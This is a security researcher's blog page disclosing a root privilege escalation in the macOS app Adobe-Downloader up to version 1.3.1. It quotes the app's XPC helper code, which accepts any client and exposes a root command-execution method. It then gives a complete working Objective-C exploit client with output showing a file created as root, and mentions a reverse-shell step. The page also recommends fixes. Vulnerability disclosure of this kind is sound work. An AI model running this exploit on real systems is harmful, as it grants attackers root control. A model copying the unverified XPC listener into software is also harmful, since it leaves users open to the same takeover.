=== Content from winslow1984.com_cf855671_20250115_092113.html ===

[Skip to main content](#main-content)

[![Logo](https://winslow1984.com/uploads/images/system/2024-02/agency.png)
Winslow Blog](https://winslow1984.com)

View All

[Search](https://winslow1984.com/search)
[Shelves](https://winslow1984.com/shelves)
[Books](https://winslow1984.com/books)
[Log in](https://winslow1984.com/login)

Info

Content

##### Details

[Revision #1](https://winslow1984.com/books/cve-collection/page/adobe-downloader-131-local-privilege-escalation/revisions)

Created 4 weeks ago by [winslow](https://winslow1984.com/user/winslow)

Updated 4 weeks ago by [winslow](https://winslow1984.com/user/winslow)

##### Actions

[Revisions](https://winslow1984.com/books/cve-collection/page/adobe-downloader-131-local-privilege-escalation/revisions)

---

Export

* [Contained Web File.html](https://winslow1984.com/books/cve-collection/page/adobe-downloader-131-local-privilege-escalation/export/html)
* [PDF File.pdf](https://winslow1984.com/books/cve-collection/page/adobe-downloader-131-local-privilege-escalation/export/pdf)
* [Plain Text File.txt](https://winslow1984.com/books/cve-collection/page/adobe-downloader-131-local-privilege-escalation/export/plaintext)
* [Markdown File.md](https://winslow1984.com/books/cve-collection/page/adobe-downloader-131-local-privilege-escalation/export/markdown)

##### Page Navigation

- [XPC Local Privilege Escalation](#bkmrk-xpc-local-privilege-)
- [Description](#bkmrk-description)
- [Impact](#bkmrk-impact)
- [Reproduction](#bkmrk-reproduction)
- [Recommendation](#bkmrk-recommendation)

##### Book Navigation

* [#### CVE Collection](https://winslow1984.com/books/cve-collection)
* [#### CKAN Authenticated SSRF <= 2.9.11/2.10.4](https://winslow1984.com/books/cve-collection/page/ckan-authenticated-ssrf-29112104)
* [#### CraftCMS](https://winslow1984.com/books/cve-collection/page/craftcms)
* [#### Adobe-Downloader <=1.3.1 Local Privilege Escalation](https://winslow1984.com/books/cve-collection/page/adobe-downloader-131-local-privilege-escalation)
* [#### Stats < v2.11.22 Local Privilege Escalation](https://winslow1984.com/books/cve-collection/page/stats-v21122-local-privilege-escalation)

[Books](https://winslow1984.com/books)

 [CVE Collection](https://winslow1984.com/books/cve-collection)

 [Adobe-Downloader <=1.3...](https://winslow1984.com/books/cve-collection/page/adobe-downloader-131-local-privilege-escalation)

# Adobe-Downloader <=1.3.1 Local Privilege Escalation

### **XPC Local Privilege Escalation**

##### **Description**

The Adobe-Downloader application is vulnerable to a local privilege escalation due to insecure implementation of its XPC service. The application registers a Mach service under the name **com.x1a0he.macOS.Adobe-Downloader.helper**. The associated binary, **com.x1a0he.macOS.Adobe-Downloader.helper,** is a privileged helper tool designed to execute actions requiring elevated privileges on behalf of the client.

The root cause of this vulnerability lies in the **shouldAcceptNewConnection** method, which unconditionally returns **YES** (or **true**), allowing any XPC client to connect to the service without any form of verification. Consequently, unauthorized clients can establish a connection to the Mach service and invoke methods exposed by the HelperToolProtocol interface.

```
extension HelperTool: NSXPCListenerDelegate {
    func listener(_ listener: NSXPCListener, shouldAcceptNewConnection newConnection: NSXPCConnection) -> Bool {
        newConnection.exportedInterface = NSXPCInterface(with: HelperToolProtocol.self)
        newConnection.exportedObject = self

        newConnection.invalidationHandler = { [weak self] in
            self?.connections.remove(newConnection)
        }

        connections.insert(newConnection)
        newConnection.resume()

        return true
    }
}
```

Among the available methods, the **executeCommand** method is particularly dangerous. It allows the execution of arbitrary shell commands with root privileges, effectively granting attackers full control over the system.

```
@objc(HelperToolProtocol) protocol HelperToolProtocol {
    func executeCommand(_ command: String, withReply reply: @escaping (String) -> Void)
    func startInstallation(_ command: String, withReply reply: @escaping (String) -> Void)
    func getInstallationOutput(withReply reply: @escaping (String) -> Void)
}
```
##### **Impact**

An attacker can exploit the vulnerability to execute arbitrary code with root privilege.

##### **Reproduction**

1. Create a custom xpc client (exploit) with the following code:

```
#import <Foundation/Foundation.h>

static NSString* XPCHelperMachServiceName = @"com.x1a0he.macOS.Adobe-Downloader.helper";

@protocol HelperToolProtocol

- (void)executeCommand:(NSString *)command withReply:(void (^)(NSString *response))reply;
- (void)startInstallation:(NSString *)command withReply:(void (^)(NSString *response))reply;
- (void)getInstallationOutputWithReply:(void (^)(NSString *output))reply;
@end

int main()
{

    NSString*  service_name = XPCHelperMachServiceName;
    NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
    NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
    [connection setRemoteObjectInterface:interface];
    [connection resume];
    id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error)
               {
                 NSLog(@"[-] Something went wrong");
                 NSLog(@"[-] Error: %@", error);
               }
             ];
   NSLog(@"Object: %@", obj);
   NSLog(@"Connection: %@", connection);
   NSString * command = @"touch /tmp/pwn.txt";

   [obj executeCommand:command withReply:^(NSString *response)
    {
       NSLog(@"Response, %@", response);
    }
   ];

  NSLog(@"Exploitation Completed!");

}
```

2. Compile and run the exploit, we can notice the command was executed by root, as a new txt file was created by root.

```
adler@adlers-Mac-mini xpc-exp % ls -al /tmp/pwn.txt
ls: /tmp/pwn.txt: No such file or directory
adler@adlers-Mac-mini xpc-exp % ./adobe-downloader
2024-12-10 01:05:06.823 adobe-downloader[76237:2841517] Object: <__NSXPCInterfaceProxy_HelperToolProtocol: 0x600001058140>
2024-12-10 01:05:06.824 adobe-downloader[76237:2841517] Connection: <NSXPCConnection: 0x600000254140> connection to service named com.x1a0he.macOS.Adobe-Downloader.helper
2024-12-10 01:05:06.824 adobe-downloader[76237:2841517] Exploitation Completed!
adler@adlers-Mac-mini xpc-exp % ls -al /tmp/pwn.txt
-rw-r--r--  1 root  wheel  0 Dec 10 01:05 /tmp/pwn.txt
```

3. Change the command to obtain a reverse shell:

[![stats.png](https://winslow1984.com/uploads/images/gallery/2024-12/scaled-1680-/stats.png)](https://winslow1984.com/uploads/images/gallery/2024-12/stats.png)

##### **Recommendation**

Implement strong client verification, including code signing checks, audit token verification, a good example can be found at <https://github.com/objective-see/BlockBlock/blob/aa83b7326a4823e78cb2f2d214d39bc8af26ed79/Daemon/Daemon/XPCListener.m#L147>. It is also important to enable hardened runtime and restrict some entitlements, such as **com.apple.security.cs.disable-library-validation**, **com.apple.security.cs.allow-dyld-environment-variables**, **com.apple.private.security.clear-library-validation,** etc.

Enter section select mode

[Previous

CraftCMS](https://winslow1984.com/books/cve-collection/page/craftcms)

[Next

Stats < v2.11.22 Local Privilege Escalation](https://winslow1984.com/books/cve-collection/page/stats-v21122-local-privilege-escalation)

 Back to top


